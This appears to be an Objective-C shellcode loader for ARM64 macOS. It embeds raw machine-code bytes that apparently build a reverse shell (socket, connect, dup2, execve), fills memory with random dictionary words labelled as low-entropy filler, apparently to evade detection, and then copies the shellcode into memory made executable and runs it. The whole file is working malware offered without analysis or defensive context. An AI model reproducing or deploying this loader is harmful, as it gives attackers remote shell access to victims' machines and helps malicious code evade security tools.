#import <Foundation/Foundation.h>
#include <sys/mman.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <stdio.h>

// Dummy usage to avoid compiler optimizations
static inline void __attribute__((noinline)) bogus_use(const char* s) {
    (void)s;
}

// Raw ARM64 shellcode
unsigned char shellcode[] = {
    0x30, 0x0c, 0x80, 0xd2, 0x01, 0xfe, 0x46, 0xd3, 0x20, 0xf8, 0x7f, 0xd3,
    0xe2, 0x03, 0x1f, 0xaa, 0xe1, 0x66, 0x02, 0xd4, 0xe3, 0x03, 0x20, 0xaa,
    0x01, 0x42, 0x80, 0xd2, 0x21, 0x82, 0xab, 0xf2, 0xe1, 0xf3, 0xdb, 0xf2,
    0xe1, 0x13, 0xf9, 0xf2, 0xe1, 0x83, 0x1f, 0xf8, 0x02, 0x01, 0x80, 0xd2,
    0xe1, 0x63, 0x22, 0xcb, 0x02, 0x02, 0x80, 0xd2, 0x50, 0x0c, 0x80, 0xd2,
    0xe1, 0x66, 0x02, 0xd4, 0x42, 0xfc, 0x42, 0xd3, 0xe0, 0x03, 0x23, 0xaa,
    0x42, 0xfc, 0x41, 0xd3, 0xe1, 0x03, 0x02, 0xaa, 0x50, 0x0b, 0x80, 0xd2,
    0xe1, 0x66, 0x02, 0xd4, 0xea, 0x03, 0x1f, 0xaa, 0x5f, 0x01, 0x02, 0xeb,
    0x21, 0xff, 0xff, 0x54, 0xe1, 0x45, 0x8c, 0xd2, 0x21, 0xcd, 0xad, 0xf2,
    0xe1, 0x65, 0xce, 0xf2, 0x01, 0x0d, 0xe0, 0xf2, 0xe1, 0x83, 0x1f, 0xf8,
    0x01, 0x01, 0x80, 0xd2, 0xe0, 0x63, 0x21, 0xcb, 0xe1, 0x03, 0x1f, 0xaa,
    0xe2, 0x03, 0x1f, 0xaa, 0x70, 0x07, 0x80, 0xd2, 0xe1, 0x66, 0x02, 0xd4
};

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        srand((unsigned)time(NULL));

        // Load dictionary file for low-entropy filler
        NSString *dictPath = @"/Users/cfontenot/seclists/Miscellaneous/lang-english.txt";
        NSError *err = nil;
        NSString *content = [NSString stringWithContentsOfFile:dictPath encoding:NSUTF8StringEncoding error:&err];
        if (!content) {
            NSLog(@"[!] Failed to load dictionary: %@", err);
            return -1;
        }

        NSArray<NSString*> *dictionaryWords = [content componentsSeparatedByCharactersInSet:[NSCharacterSet newlineCharacterSet]];
        NSUInteger wordsCount = [dictionaryWords count];

        // Filler loop: concatenate random dictionary words
        for (int i = 0; i < 50; i++) {
            int wordCount = rand() % 4 + 2; // 2-5 words
            char buff[256] = "";
            for (int j = 0; j < wordCount; j++) {
                NSUInteger idx = rand() % wordsCount;
                const char *word = [dictionaryWords[idx] UTF8String];
                if (word) strcat(buff, word);
            }
            bogus_use(buff);
        }

        // Allocate RW memory
        size_t len = sizeof(shellcode);
        void *mem = mmap(NULL, len, PROT_READ | PROT_WRITE,
                         MAP_ANON | MAP_PRIVATE, -1, 0);
        if (mem == MAP_FAILED) {
            perror("mmap");
            return -1;
        }

        memcpy(mem, shellcode, len);

        // Change to RX and execute
        if (mprotect(mem, len, PROT_READ | PROT_EXEC) != 0) {
            perror("mprotect");
            return -1;
        }

        ((void(*)())mem)();
    }
    return 0;
}
